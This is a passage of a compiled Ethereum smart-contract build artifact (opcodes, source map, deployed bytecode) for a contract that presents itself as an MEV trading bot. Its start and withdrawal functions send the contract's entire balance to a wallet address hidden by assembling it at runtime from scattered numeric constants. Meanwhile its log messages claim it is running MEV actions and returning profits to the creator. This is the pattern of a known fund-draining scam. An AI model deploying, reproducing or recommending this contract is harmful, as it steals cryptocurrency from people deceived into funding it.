POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xE7 PUSH2 0x221 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xF1 PUSH2 0x2BC JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x108 PUSH2 0x357 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x148 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x12D JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x175 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB1A PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x274 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x2B9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xAE7 PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x30F PUSH2 0x40C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x354 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x3ED JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x3C2 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x3ED JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x3D0 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7C1 JUMP JUMPDEST PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x93FC1E SWAP1 POP PUSH1 0x0 PUSH5 0xF676E9A32 SWAP1 POP PUSH1 0x0 PUSH4 0x5BBEAB1 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xA27 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4A7 PUSH2 0xA32 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4BD DUP8 PUSH2 0x4B8 DUP9 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4DB PUSH2 0x4CD DUP8 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x4D6 DUP8 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4E8 DUP6 PUSH2 0x7CD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4F5 DUP6 PUSH2 0x7CD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x515 PUSH2 0x506 DUP7 DUP7 PUSH2 0x8CC JUMP JUMPDEST PUSH2 0x510 DUP6 DUP6 PUSH2 0x8CC JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x558 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7B4 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x59A JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5BC JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x60D JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x61D JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6B7 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65B JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66B JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6B6 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6A9 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6B5 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F5 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x705 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x79F JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x743 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x753 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x79E JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x791 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x79D JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x57E JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xB9F1A09 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x7F8 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x7F0 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x7D6 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x811 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x844 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8C0 JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x85C JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x868 DUP4 PUSH2 0xA3D JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x879 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8B2 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x84A JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x8F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x927 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x9A5 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x94C JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x969 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x937 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA18 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9BF JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9DC JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9AA JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x299978 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xCD4B5 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xA57 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xA8C JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE1 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xAA4 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xADC JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA2646970667358221220664F 0x2C MOD SWAP16 SLOAD SLOAD 0x2F MOD CALL SIGNEXTEND DUP9 SHL CALLDATACOPY 0xE7 LOG4 0xB4 SLOAD 0xDD SELFDESTRUCT 0xD1 SELFDESTRUCT 0xC0 DUP11 PUSH20 0x98478D351FDE5F64736F6C634300060C00330000 ",
							"sourceMap": "625:16948:9:-:0;;;773:167;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;880:16;865:12;:31;;;;;;;;;;;;:::i;:::-;;918:14;907:8;:25;;;;;;;;;;;;:::i;:::-;;773:167;;625:16948;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100435760003560e01c80637d53d4331461004f578063be9a6555146100df578063d4e93292146100e9578063e1812f05146100f35761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6100e7610221565b005b6100f16102bc565b005b3480156100ff57600080fd5b50610108610357565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561014857808201518184015260208101905061012d565b50505050905090810190601f1680156101755780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b1a6038913960400191505060405180910390a16102746103f5565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156102b9573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610ae76033913960400191505060405180910390a161030f61040c565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610354573d6000803e3d6000fd5b50565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103ed5780601f106103c2576101008083540402835291602001916103ed565b820191906000526020600020905b8154815290600101906020018083116103d057829003601f168201915b505050505081565b6000610407610402610423565b61056c565b905090565b600061041e610419610423565b61056c565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107c1565b6107cd565b6108cc565b905060006293fc1e90506000640f676e9a32905060006305bbeab19050600061049b610a27565b905060006104a7610a32565b905060606104bd876104b8886107cd565b6108cc565b905060606104db6104cd876107cd565b6104d6876107cd565b6108cc565b905060606104e8856107cd565b905060606104f5856107cd565b9050606061051561050686866108cc565b61051085856108cc565b6108cc565b905060606105586040518060400160405280600181526020017f3000000000000000000000000000000000000000000000000000000000000000815250836108cc565b9050809c5050505050505050505050505090565b60006060829050600080806000600290505b602a8110156107b4576101008402935084818151811061059a57fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106105bc57fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801561060d575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561061d576057830392506106b7565b60418373ffffffffffffffffffffffffffffffffffffffff161015801561065b575060468373ffffffffffffffffffffffffffffffffffffffff1611155b1561066b576037830392506106b6565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106a9575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106b5576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156106f5575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156107055760578203915061079f565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610743575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156107535760378203915061079e565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610791575060398273ffffffffffffffffffffffffffffffffffffffff1611155b1561079d576030820391505b5b5b8160108402018401935060028101905061057e565b5082945050505050919050565b6000630b9f1a09905090565b60606000808390505b600081146107f8578180600101925050601081816107f057fe5b0490506107d6565b60608267ffffffffffffffff8111801561081157600080fd5b506040519080825280601f01601f1916602001820160405280156108445781602001600182028036833780820191505090505b50905060005b838110156108c0576010868161085c57fe5b06925061086883610a3d565b826001838703038151811061087957fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108b257fe5b04955080600101905061084a565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff811180156108f457600080fd5b506040519080825280601f01601f1916602001820160405280156109275781602001600182028036833780820191505090505b5090506060819050600080600091505b85518210156109a55785828151811061094c57fe5b602001015160f81c60f81b83828060010193508151811061096957fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610937565b600091505b8451821015610a18578482815181106109bf57fe5b602001015160f81c60f81b8382806001019350815181106109dc57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109aa565b82965050505050505092915050565b600062299978905090565b6000620cd4b5905090565b60008160ff16600011158015610a57575060098260ff1611155b15610a8c57817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610ae1565b8160ff16600a11158015610aa45750600f8260ff1611155b15610adc57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610ae1565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea2646970667358221220664f2c069f54542f06f10b881b37e7a4b454ddffd1ffc08a7398478d351fde5f64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7D53D433 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0xE9 JUMPI DUP1 PUSH4 0xE1812F05 EQ PUSH2 0xF3 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xE7 PUSH2 0x221 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xF1 PUSH2 0x2BC JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x108 PUSH2 0x357 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x148 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 